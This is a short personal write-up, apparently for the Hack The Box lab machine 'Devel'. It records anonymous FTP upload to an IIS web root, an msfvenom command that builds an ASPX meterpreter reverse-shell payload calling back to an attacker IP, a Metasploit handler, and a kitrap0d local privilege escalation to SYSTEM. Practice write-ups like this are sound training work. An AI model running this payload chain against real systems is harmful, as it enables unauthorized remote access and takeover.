---
tags: [HTB]
title: Devel
created: '2020-05-12T17:36:00.140Z'
modified: '2020-05-12T18:12:59.507Z'
---

# Devel
- Port 21 and 80 are open
- We can login into anonymous on the ftp server and list the file contents, we see we are in the web directory
- scoping this box we can look to see what version of windows it is possibly running by looking at the iis7 server, and we can assume it is possibly 2008 R2
- next we can use msfvenom to create a payload using an aspx file searching for the payload windows
- msfvenom --list payload | grep windows
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f aspx -o reverse.aspx
- after we created the payload, we need to go into msfconsole to set up a multi/handler
- set payload windows/meterpreter/reverse_tcp
- next we need to set up the lhost and lport
- once we have that we run and then run the file on the server
- we get a meterpreter shell back and we are not system32, but that allows us to look for possible exploits on the server
- run sysinfo or shell then systeminfo to see possible timelines of the server, it is win7 so it should be pretty bad
- bg
- search suggest, then use the post/multi/recon/local_exploit_suggester
- set session 1
- run that and then we see there are a ton of exploits, so let's use ms10_015_kitrap0d
- we can run that and it won't work but it allows us to change the lhost
- change the lost then we can exploit to system32
- type C:\Users\Administrator\Desktop\root.txt.txt
- type C:\Users\babis\Desktop\user.txt.txt

